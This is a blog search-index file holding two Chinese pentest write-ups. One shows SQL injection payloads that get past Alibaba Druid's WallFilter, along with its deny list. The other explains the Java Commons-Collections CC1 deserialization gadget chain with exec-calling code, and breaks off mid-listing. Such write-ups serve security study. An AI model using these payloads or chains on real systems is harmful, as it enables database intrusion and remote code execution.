<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Druid WallFilter 绕过浅析</title>
      <link href="/posts/Druid-WallFilter.html"/>
      <url>/posts/Druid-WallFilter.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>之前挖洞的时候遇到了一个 SQL 注入，测试时可以看到回显的 SQL 语句，但是一直被拦截，搜索了下发现是 WallFilter</p></blockquote><p>WallFilter是阿里巴巴的<a href="https://github.com/alibaba/druid">数据库连接池Druid</a>中一个特殊的 Filter，主要功能是用于监控SQL安全，并基于SQL语法进行分析，理解其中的 SQL 语义，然后作出智能准确的处理，从而避免 SQL 注入。</p><h2 id="拦截1"><a href="#拦截1" class="headerlink" title="拦截1"></a>拦截1</h2><p>首次尝试注入，Payload 如下：</p><figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-f8gyjllr592jba"></i><span>  Sql  </span><div class="collapse show" id="collapse-f8gyjllr592jba"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span>(sleep(<span class="number">5</span>)))a)#</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>抛出异常：<code>sql injection violation, comment not allow</code></p><p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-0.png" data-caption="Druid-WallFilter-0"><img src="/assets/Druid-WallFilter-0.png" alt="Druid-WallFilter-0"></a></p><p>原因是 WallFilter 的默认拦截策略是<strong>不允许 SQL 中带有注释</strong>，而这里的 Payload 明显含有注释，因此被拦截。参考：<a href="https://github.com/alibaba/druid/wiki/WallFilter-%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99">alibaba&#x2F;druid - WallFilter拦截规则</a></p><h2 id="拦截2"><a href="#拦截2" class="headerlink" title="拦截2"></a>拦截2</h2><p>再次尝试注入，修改后的 Payload 如下：</p><figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-plm6wclr592jba"></i><span>  Sql  </span><div class="collapse show" id="collapse-plm6wclr592jba"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> database())),<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>这次的报错为：<code>sql injection violation, syntax error</code></p><p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-1.png" data-caption="Druid-WallFilter-1"><img src="/assets/Druid-WallFilter-1.png" alt="Druid-WallFilter-1"></a></p><p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-2.png" data-caption="Druid-WallFilter-2"><img src="/assets/Druid-WallFilter-2.png" alt="Druid-WallFilter-2"></a></p><p>原因是默认配置下，WallFilter 拦截了如下函数和关键字：</p><ul><li><a href="https://mp.weixin.qq.com/s/lGalf63VXCva2I5BpmSMgQ">Druid拦截功能的配置与简单绕过</a></li><li><a href="https://github.com/alibaba/druid/tree/master/src/main/resources/META-INF/druid/wall">alibaba&#x2F;druid&#x2F;wall</a></li></ul><figure class="highlight basic"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-dka3oglr592jba"></i><span>  Basic  </span><div class="collapse show" id="collapse-dka3oglr592jba"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">deny-function:</span><br><span class="line">  version</span><br><span class="line">  load_file</span><br><span class="line">  database</span><br><span class="line">  schema</span><br><span class="line">  user</span><br><span class="line">  system_user</span><br><span class="line">  session_user</span><br><span class="line">  benchmark</span><br><span class="line">  current_user</span><br><span class="line">  sleep</span><br><span class="line">  xmltype</span><br><span class="line">  receive_message</span><br><span class="line"></span><br><span class="line">deny-schema:</span><br><span class="line">  information_schema</span><br><span class="line">  mysql</span><br><span class="line">  performance_schema    </span><br><span class="line"></span><br><span class="line">deny-variant:</span><br><span class="line">  basedir</span><br><span class="line">  version_compile_os</span><br><span class="line">  version</span><br><span class="line">  datadir</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h2 id="其它查询"><a href="#其它查询" class="headerlink" title="其它查询"></a>其它查询</h2><p>尝试查询其它的变量</p><figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-rzgr1ylr592jba"></i><span>  Sql  </span><div class="collapse show" id="collapse-rzgr1ylr592jba"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES;               # 查看全局变量</span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">GLOBAL</span> VARIABLES <span class="keyword">like</span> <span class="string">&#x27;%xxx%&#x27;</span>;  # 模糊查询全局变量</span><br><span class="line"><span class="keyword">SELECT</span> @<span class="variable">@global</span>.变量名;               # 查看指定全局变量的值</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES;                      # 查看用户变量</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">like</span> <span class="string">&#x27;%xxx%&#x27;</span>;         # 模糊查询用户变量</span><br><span class="line"><span class="keyword">SELECT</span> @@变量名;                      # 查看指定用户变量的值</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>这里查几个变量，发现可以成功查询，Payload如下：</p><figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-nkgjtglr592jba"></i><span>  Sql  </span><div class="collapse show" id="collapse-nkgjtglr592jba"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="built_in">current_user</span>)),<span class="number">0</span>))</span><br><span class="line"><span class="keyword">and</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> @<span class="variable">@plugin</span>_dir)),<span class="number">0</span>))</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-3.png" data-caption="Druid-WallFilter-3"><img src="/assets/Druid-WallFilter-3.png" alt="Druid-WallFilter-3"></a></p><p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-4.png" data-caption="Druid-WallFilter-4"><img src="/assets/Druid-WallFilter-4.png" alt="Druid-WallFilter-4"></a></p><h2 id="尝试绕过"><a href="#尝试绕过" class="headerlink" title="尝试绕过"></a>尝试绕过</h2><p>前面得知禁用了<code>information_schema</code>，这里利用<code>MySQL5.6+</code>的<code>sys</code>系统库中的某些表来尝试绕过。</p><ul><li><a href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysql注入绕过information_schema过滤</a></li><li><a href="https://blog.csdn.net/soldi_er/article/details/116901009">SQL注入-查表查列</a></li><li><a href="https://blog.csdn.net/plant1234/article/details/118033711">Bugku sql注入 基于布尔的SQL盲注</a></li></ul><figure class="highlight sql"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-674flslr592jba"></i><span>  Sql  </span><div class="collapse show" id="collapse-674flslr592jba"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use sys</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line"># 默认sys库中，保存库名和表名的信息的表</span><br><span class="line">sys.schema_table_statistics_with_buffer</span><br><span class="line">sys.schema_index_statistics</span><br><span class="line">sys.schema_table_statistics</span><br><span class="line">sys.schema_auto_increment_columns </span><br><span class="line">sys.x$schema_index_statistics</span><br><span class="line">sys.x$schema_table_statistics</span><br><span class="line">sys.x$schema_table_statistics_with_buffer</span><br><span class="line"></span><br><span class="line"># 示例查询,其中table_schema为库名, table_name为表名</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> table_schema, table_name <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"># 其它目前可记录的表</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.version;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> object_schema <span class="keyword">from</span> sys.innodb_buffer_stats_by_schema;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> object_schema, object_name <span class="keyword">from</span> sys.innodb_buffer_stats_by_table;</span><br><span class="line"></span><br><span class="line"># MySQL默认存储引擎innoDB携带的表, 两表均有database_name和table_name字段</span><br><span class="line">mysql.innodb_table_stats</span><br><span class="line">mysql.innodb_index_stats</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>测试之后发现报错：<code>SELECT command denied ...</code>，原因是<strong>当前用户权限不足</strong>所导致。如果数据库当前用户为<code>root</code>或者其它具有对应权限的用户时，利用这个办法进行绕过是可行的</p><p><a data-fancybox="gallery" data-src="/assets/Druid-WallFilter-5.png" data-caption="Druid-WallFilter-5"><img src="/assets/Druid-WallFilter-5.png" alt="Druid-WallFilter-5"></a></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> Bypass </tag>
            
            <tag> Trick </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全漫谈-CC1篇</title>
      <link href="/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87.html"/>
      <url>/posts/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87.html</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>这条链在 Java 8u71 以后就不能利用了，这里使用的环境是 Java8u66</li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-0.png" data-caption="Java安全漫谈-CC1篇-0"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-0.png" alt="Java安全漫谈-CC1篇-0"></a></p><ul><li>另外需要取消勾选此处两个<code>Enable</code><blockquote><p>IDEA中Debug时调试器会调用一些toString方法，从而造成非预期的命令执行</p></blockquote></li></ul><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-1.png" data-caption="Java安全漫谈-CC1篇-1"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-1.png" alt="Java安全漫谈-CC1篇-1"></a></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p>Transformer 是一个接口，只有一个<code>transformer()</code>方法</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><code>ChainedTransformer</code>是实现了<code>transformer</code>接口的类，该类会对传入的<code>Transformer</code>数组进行<strong>链式调用</strong>。即将前一个<code>Transformer</code>的执行结果当作参数传递到下一个，直至全部<code>Transformer</code>执行完毕后返回</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-2.png" data-caption="Java安全漫谈-CC1篇-2"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-2.png" alt="Java安全漫谈-CC1篇-2"></a></p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>ConstantTransformer</code>也是实现了<code>Transform</code>接口的类，它的作用是<strong>直接返回传入的对象</strong>，这里将该类作为调用链的开端</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-3.png" data-caption="Java安全漫谈-CC1篇-3"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-3.png" alt="Java安全漫谈-CC1篇-3"></a></p><ul><li>示例：这里传入的是<code>Runtime.getRuntime()</code>，所以将会返回<code>Runtime</code>对象</li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ooxlgwlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-ooxlgwlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">/* ConstantTransformer */</span></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">ct</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transform</span> <span class="operator">=</span> ct.transform(<span class="number">1</span>);</span><br><span class="line">        System.out.println(transform);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// class java.lang.Runtime</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>也是实现了<code>Transformer</code>接口的类，该类的作用是<strong>通过反射调用输入对象的指定方法</strong>，并将调用结果返回，这个正是执行恶意命令的核心类</p><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-4.png" data-caption="Java安全漫谈-CC1篇-4"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-4.png" alt="Java安全漫谈-CC1篇-4"></a></p><ul><li>示例：以<code>Runtime.getRuntime().exec(String command)</code>为例，该方法接收一个<code>String</code>类型的参数</li></ul><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-vhrty8lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-vhrty8lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">     <span class="comment">/* InvokerTransformer</span></span><br><span class="line"><span class="comment">      * Runtime.getRuntime().exec(String command)</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">    <span class="comment">// 初始化时需要传入待调用的方法exec、参数类型String.class，以及待执行的命令command</span></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">            <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                <span class="string">&quot;open -a Calculator&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">     <span class="comment">// 调用transform()方法时传入对象  </span></span><br><span class="line">        exec.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><h3 id="Java动态代理"><a href="#Java动态代理" class="headerlink" title="Java动态代理"></a>Java动态代理</h3><blockquote><p>Java 动态代理，我的理解就是可以对一个实例对象中的方法进行监听（实例在调用方法时会触发<code>invoke()</code>方法），并且在特定方法被调用时，触发一些自定义的处理操作。</p></blockquote><p>创建一个处理器类，该类将接收一个<code>Map</code>对象并进行处理。这里实例在调用方法时会输出方法名，并且在调用<code>Map</code>对象的<code>get()</code>方法时，返回特定字符串</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-2liqktlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-2liqktlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PorxyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> Map map;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PorxyHandler</span><span class="params">(Map map)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 当前触发的方法</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hooking: &quot;</span> + methodName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (methodName.compareTo(<span class="string">&quot;get&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Hacked Object&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> method.invoke(<span class="built_in">this</span>.map, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>向处理器类传入一个<code>HashMap</code>，并使用代理类<code>Proxy</code>将其实例化。当该实例对象调用方法，将触发处理器类<code>PorxyHandler#invoke()</code>方法</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-ytygl9lr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-ytygl9lr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> deserialization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxyApp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">PorxyHandler</span> <span class="variable">porxyHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PorxyHandler</span>(<span class="keyword">new</span> <span class="title class_">HashMap</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化代理类</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(</span><br><span class="line">            Map.class.getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,</span><br><span class="line">            porxyHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        proxyMap.put(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> (String) proxyMap.get(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        System.out.println(res);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 输出结果:</span></span><br><span class="line"><span class="comment">Hooking: put</span></span><br><span class="line"><span class="comment">Hooking: get</span></span><br><span class="line"><span class="comment">Hacked Object</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></div></figure><p><a data-fancybox="gallery" data-src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-5.png" data-caption="Java安全漫谈-CC1篇-5"><img src="/assets/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88-CC1%E7%AF%87-5.png" alt="Java安全漫谈-CC1篇-5"></a></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><blockquote><p>整条利用链可以分为两部分，前半部分是构造<code>transformers</code>链，后半部分是调用其<code>transformer</code>方法</p></blockquote><p>利用链：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-0g49xwlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-0g49xwlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">  ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">    AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">      Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">        AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">          LazyMap.get()</span></span><br><span class="line"><span class="comment">            ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">              ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">              InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                Method.invoke()</span></span><br><span class="line"><span class="comment">                  Class.getMethod()</span></span><br><span class="line"><span class="comment">              InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                Method.invoke()</span></span><br><span class="line"><span class="comment">                  Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">              InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                Method.invoke()</span></span><br><span class="line"><span class="comment">                  Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">  commons-collections</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>完整代码：</p><figure class="highlight java"><i class="fas fa-laptop-code" type="button" data-toggle="collapse" data-target="#collapse-7e61exlr592jbb"></i><span>  Java  </span><div class="collapse show" id="collapse-7e61exlr592jbb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[] &#123; command &#125;;</span><br><span class="line">    <span class="comment">// inert chain for setup</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123; <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>) &#125;</span><br><span class="line">    );</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// real chain for after setup</span></span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title 